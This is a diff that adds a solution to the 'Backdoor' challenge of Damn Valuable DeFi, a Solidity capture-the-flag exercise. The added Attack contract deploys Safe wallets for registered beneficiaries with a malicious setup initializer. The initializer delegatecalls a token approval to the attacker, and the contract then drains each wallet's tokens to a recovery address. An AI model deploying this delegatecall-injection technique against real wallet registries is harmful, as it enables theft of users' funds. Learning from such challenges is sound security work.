@@ -4,9 +4,10 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxyFactory, IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +71,11 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        // Deploy the attack contract
+        Attack attack = new Attack(address(walletRegistry), address(singletonCopy), address(walletFactory), token, recovery);
+
+        // Call the attack contract to drain the funds
+        attack.initiateAttack(users);
     }
 
     /**
@@ -92,5 +97,52 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Attack {
+    address private immutable WALLET_REGISTRY;
+    address private immutable SINGLETON_COPY;
+    address private immutable WALLET_FACTORY;
+    DamnValuableToken private immutable DVT;
+    address public recovery;
+
+    constructor(address walletRegistry, address singletonCopy, address walletFactory, DamnValuableToken dvt, address _recovery) {
+        WALLET_REGISTRY = walletRegistry;
+        SINGLETON_COPY = singletonCopy;
+        WALLET_FACTORY = walletFactory;
+        DVT = dvt;
+        recovery = _recovery;
+    }
+
+    function delegateApprove(address _spender) external {
+        DVT.approve(_spender, 10 ether);
+    }
+
+    function initiateAttack(address[] memory _beneficiaries) external {
+        // For each beneficiary, create a wallet
+        for (uint256 i = 0; i < 4; i++) {
+            // create a the initializer payload
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = _beneficiaries[i];
+
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector, // selector
+                beneficiary,         // beneficiaries
+                1,                   // threshold
+                address(this),       // to address to make delegate call (this address will be call with the data payload)
+                abi.encodeWithSelector(Attack.delegateApprove.selector, address(this)), // data payload to call delegateApprove, this basically will approve 10 ether to this contract
+                address(0),          // fallback handler
+                0,                   // payment token
+                0,                   // payment value
+                0                    // payment Receiver
+                );
+
+            // create a new wallet onbehalf of the beneficiary
+            SafeProxy newProxy = SafeProxyFactory(WALLET_FACTORY).createProxyWithCallback(SINGLETON_COPY, initializer, i, IProxyCreationCallback(WALLET_REGISTRY));
+            // finally transfer the tokens to the recovery address
+            DVT.transferFrom(address(newProxy), recovery, 10 ether);
+        }
+
     }
 }
